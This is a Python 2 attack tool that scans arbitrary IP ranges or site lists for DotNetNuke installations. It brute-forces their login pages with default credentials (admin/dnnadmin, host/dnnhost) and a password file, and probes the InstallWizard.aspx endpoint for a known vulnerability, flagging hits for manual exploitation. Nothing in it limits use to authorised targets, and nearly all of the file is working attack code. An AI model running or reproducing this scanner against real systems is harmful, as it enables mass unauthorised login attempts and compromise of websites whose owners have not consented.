import time
import sys
import os
import ssl
import re
import argparse
from urlparse import urlparse
from socket import timeout as socket_timeout
from socket import error as socket_error

# Import requests, to handle the get and post requests
try:

    import requests

except ImportError:
    print('[!]Could not import requests module.')
    sys.exit()

try:

    from requests_toolbelt import MultipartEncoder

except ImportError:
    print('[!]Could not import requests_toolbelt module.')
    sys.exit()

try:
    from bs4 import BeautifulSoup as bs
    from bs4 import Comment

except ImportError:
    print('[!]Could not import BeautifulSoup module.')
    sys.exit()

import Queue
import threading

requests.packages.urllib3.disable_warnings()


def check_comments(comments):
    for pattern in ('DotNetNuke Platform', 'DNN Corporation'):
        for comment in comments:

            if pattern in comment:
                return True

    return False


def check_exploit(thread_id, target_url):

    outputQueue.put(('p', '[*]Thread-{0}:\tChecking vuln: {1}'.format(thread_id, target_url,)))

    try:
        response = requests.get(target_url + 'Install/InstallWizard.aspx?__VIEWSTATE=',
                                timeout=2,
                                verify=False,
                                headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 '
                                                       '(KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36'
                                         }
                                )

    except (ssl.SSLError, requests.exceptions.RequestException, socket_error, socket_timeout):
        pass

    else:

        if response.ok and 'Warning' not in response.text:
            outputQueue.put(('p', '[+]Thread-{0}:\tProbably vuln: {1}'.format(thread_id, target_url, )))
            outputQueue.put(('w', '{0} (needs manual exploitation)'.format(target_url)))

    return


def check_login(thread_id, target_url, input_fields, credentials):

    username, password = credentials
    input_fields['dnn$ctr$Login$Login_DNN$txtUsername'] = username
    input_fields['dnn$ctr$Login$Login_DNN$txtPassword'] = password

    multipartdata = MultipartEncoder(fields=input_fields)
    outputQueue.put(('p', '[*]Thread-{0}:\tTrying login: {1} - {2} : {3}'.format(thread_id, target_url,
                                                                                 username, password)))

    try:
        response = requests.post(target_url + 'Login.aspx',
                                 headers={'Content-Type': multipartdata.content_type,
                                          'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 '
                                                        '(KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36'},
                                 data=multipartdata,
                                 timeout=2,
                                 verify=False)

    except (ssl.SSLError, requests.exceptions.RequestException, socket_error, socket_timeout):
        pass

    else:
        if response.ok and 'runningDefault' in response.url:
            outputQueue.put(('p', '[+]Thread-{0}:\tFound login: {1} - {2} : {3}'.format(thread_id, target_url,
                                                                                        username, password)))

            outputQueue.put(('w', '{0} - {1}:{2}'.format(target_url, username, password)))

        elif username == 'host' and password == 'dnnhost':
            checkExploitQueue.put((target_url,))


def check_site(thread_id, remaining_urls):

    target_url = '{0[0]}://{0[1]}/{0[2]}'.format(remaining_urls[0])
    remaining_urls = remaining_urls[1:]

    outputQueue.put(('p', '[*]Thread-{0}:\tScanning: {1}'.format(thread_id, target_url)))

    try:
        response = requests.get(target_url + 'login.aspx',
                                timeout=2,
                                verify=False,
                                headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 '
                                                       '(KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36'}
                                )

    # Should be 'except (ssl.SSLError, requests.exceptions.RequestException):',
    # but the requests module has some bugs that generate more (unknown) exceptions.
    except (ssl.SSLError, requests.exceptions.RequestException, socket_error, socket_timeout):
        remaining_urls = [remaining_url for remaining_url in remaining_urls if remaining_url[0] != protocol]

    else:

        if response.ok:

            parser = bs(response.text, 'html.parser')

            if check_comments(parser.findAll(text=lambda text: isinstance(text, Comment), limit=4)) or \
                    parser.find('script', {'src': re.compile(r'^/js/dnn(?:core)?\.js')}) or \
                    parser.find(['div', 'a'], {'id': re.compile(r'^dnn_')}):

                outputQueue.put(('p', '[*]Thread-{0}:\tFound DNN site: {1}'.format(thread_id, target_url)))

                input_tags = parser.findAll('input', {'name': True, 'id': True})
                input_fields = {'__EVENTTARGET': 'dnn$ctr$Login$Login_DNN$cmdLogin'}

                for inputTag in input_tags:
                    input_tag_name = inputTag['name']

                    if input_tag_name not in ('__EVENTTARGET',
                                              'dnn$ctr$Login$Login_DNN$txtUsername',
                                              'dnn$ctr$Login$Login_DNN$txtPassword'):

                        if inputTag.has_attr('value'):
                            input_fields[input_tag_name] = inputTag['value']
                        else:
                            input_fields[input_tag_name] = ''

                for credentials in passwordList:
                    loginQueue.put((target_url, input_fields, credentials))

                return

    if len(remaining_urls) >= 1:
        checkQueue.put((remaining_urls,))


def run(thread_id):
    """The main code, that each thread runs."""

    outputQueue.put(('p', '[*]Thread-{0}:\tStarting'.format(thread_id)))

    while not mainShutdownEvent.is_set():
        # The order of execution
        # Top first (the last step), bottom last(the first step)
        for getQueue, function in (

                (checkExploitQueue, check_exploit),
                (loginQueue, check_login),
                (checkQueue, check_site),
        ):

            try:

                data = getQueue.get(block=False)

            except Queue.Empty:
                pass

            else:

                function(thread_id, *data)

                getQueue.task_done()

    outputQueue.put(('p', '[*]Thread-{0}:\tExiting'.format(thread_id)))


def output_thread():
    """The thread that does the non thread-safe output
    (writing to a file and writing to stdout)."""

    sys.stdout.write('[+]Thread-OUT:\tStarting\n')

    while not outputShutdownEvent.is_set():
        try:
            mode, message = outputQueue.get(block=False)

        except Queue.Empty:
            pass

        else:

            message = unicode(message, errors='ignore')
            message += '\n'
            # Print a message
            if mode == 'p':
                sys.stdout.write(message)

            elif mode == 'w':
                with open(args.output_file, 'a') as hOut:
                    hOut.write(message)

            outputQueue.task_done()

    sys.stdout.write('[*]Thread-OUT:\tExiting\n')


argParser = argparse.ArgumentParser(description='DotNetNuke scanner made by g0r and sc485!')

ipGroup = argParser.add_argument_group('Ip range')
ipGroup.add_argument('-rs', '--range-start', type=str, metavar='12.34.', help='The start of the ip range. \'12.34.\' means 12.34.0.0 - 12.34.255.255')

argParser.add_argument('-sf', '--sites-file', type=str, metavar='sites.txt', help='File containing the input sites.')
argParser.add_argument('-of', '--output-file', type=str, metavar='out.txt', help='File the output will be written to.',
                       required=True)

argParser.add_argument('-pf', '--pass-file', type=str, metavar='uris.txt', help='File containing the passwords.')
argParser.add_argument('-uf', '--uri-file', type=str, metavar='uris.txt', help='File containing the uris.')
argParser.add_argument('-thr', '--threads', type=int, metavar='n', help='Number of threads.', required=True)

args = argParser.parse_args()

# Custom restrictions:

if not args.range_start and not args.sites_file:
    argParser.error('[-]Either an ip range or a sites input file need to be specified (or both).')

if args.range_start and not re.search(r'^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){1,3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)?$', args.range_start):
    print('[-]--range-start/-rs is not a valid ip address.')

# Check if the files exist.
for filename in (args.sites_file, args.uri_file):
    if filename and not os.path.isfile(filename):
        print('[!]File {0} not found!'.format(filename))
        sys.exit()

print('[*]Starting scanner!')
print('[*]Made by g0r and sc485')
start_time = time.time()

# Create queue objects
checkQueue = Queue.Queue()
checkExploitQueue = Queue.Queue()
loginQueue = Queue.Queue()

outputQueue = Queue.Queue()

# Create events
mainShutdownEvent = threading.Event()
outputShutdownEvent = threading.Event()

uris = {''}
if args.uri_file:

    with open(args.uri_file) as hURIfile:

        for line in hURIfile:
            line = line.strip()

            if line:
                uris.add(line.strip('/'))

passwordList = {('admin', 'dnnadmin'), ('host', 'dnnhost')}
if args.pass_file:

    with open(args.pass_file) as hPassFile:

        for line in hPassFile:
            line = line.strip()

            if line:
                for username in ('admin', 'host'):
                    passwordList.add((username, line))

if args.sites_file:
    found_domains = {}
    # Read the hosts file, parse the domain
    print('[*]Putting sites in queue.')
    with open(args.sites_file, 'r') as hSits:
        for line in hSits:

            url = line.strip()

            if not url.startswith('#') and url.count('.') >= 1:

                url = url.strip('/')

                if url.startswith('http://') or url.startswith('https://'):
                    protocols = (url.split('://')[0],)
                else:
                    url = 'http://{}'.format(url)
                    protocols = ('http', 'https')

                parts = urlparse(url)
                path = parts.path.strip('/')

                urls = []
                for uri in uris:

                    if len(path) > 0:
                        uri = path + '/' + uri

                    for protocol in protocols:

                        urls.append((protocol, parts.netloc, uri))

                if len(urls) > 0:
                    checkQueue.put((urls,))

if args.range_start:

    if args.range_start.endswith('.'):
        range_pre = args.range_start[:-1]
    else:
        range_pre = args.range_start

    start_ip = range_pre + '.0' * (4 - range_pre.count('.') - 1)
    end_ip = range_pre + '.255' * (4 - range_pre.count('.') - 1)

    sys.stdout.write('[*]Adding Ip range: {0} - {1}\n'.format(start_ip, end_ip))

    start = list(map(int, start_ip.split('.')))
    end = list(map(int, end_ip.split('.')))
    temp = start

    while temp != end:
        start[3] += 1
        for i in (3, 2, 1):
            if temp[i] == 256:
                temp[i] = 0
                temp[i - 1] += 1

        urls = []
        for uri in uris:
            for protocol in ('http', 'https'):
                urls.append((protocol, '.'.join(map(str, temp)) + ':80', uri))

        if len(urls) > 0:
            checkQueue.put((urls, ))

totalTargets = checkQueue.qsize()
if totalTargets == 0:
    print('[!]No targets found!')
    sys.exit()

print('[*]Found {} targets.'.format(totalTargets))

if totalTargets < args.threads:
    args.threads = totalTargets

print('[*]Starting {0} scanning threads.'.format(args.threads))

for i in range(args.threads):
    t = threading.Thread(target=run,
                         args=(i + 1,))
    t.daemon = True
    t.start()

print('[*]Starting output thread.')
t = threading.Thread(target=output_thread)
t.daemon = True
t.start()

# Work down the queues until they are all empty.
checkQueue.join()
loginQueue.join()
checkExploitQueue.join()
mainShutdownEvent.set()

# Write and print the last few messages and then exit
outputQueue.join()
outputShutdownEvent.set()

sys.stdout.write('[+]Done! Time: {time:.2f} seconds.\n'.format(time=time.time() - start_time))
